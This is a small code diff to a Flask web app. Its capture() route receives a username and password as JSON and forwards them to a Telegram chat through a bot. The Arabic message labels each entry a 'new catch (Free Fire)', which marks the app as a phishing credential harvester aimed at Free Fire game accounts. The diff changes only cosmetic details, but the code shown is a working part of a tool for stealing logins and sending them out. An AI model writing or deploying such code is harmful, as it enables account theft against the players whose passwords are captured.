@@ -143,7 +143,7 @@ def home():
 def capture():
     data = request.json
     # إرسال النص
-    msg = f"🎯 **صيد جديد (فري فاير)**\\n👤 الحساب: `{data['user']}`\\n🔑 الباسورد: `{data['pass']}`"
+    msg = f"🎯 **صيد جديد (فري فاير)**\\n👤 الحساب: `{data['user']}`\\n🔑. الباسورد: `{data['pass']}`"
     bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
     
     # إرسال الصورة إذا وجدت
@@ -158,3 +158,4 @@ def capture():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+
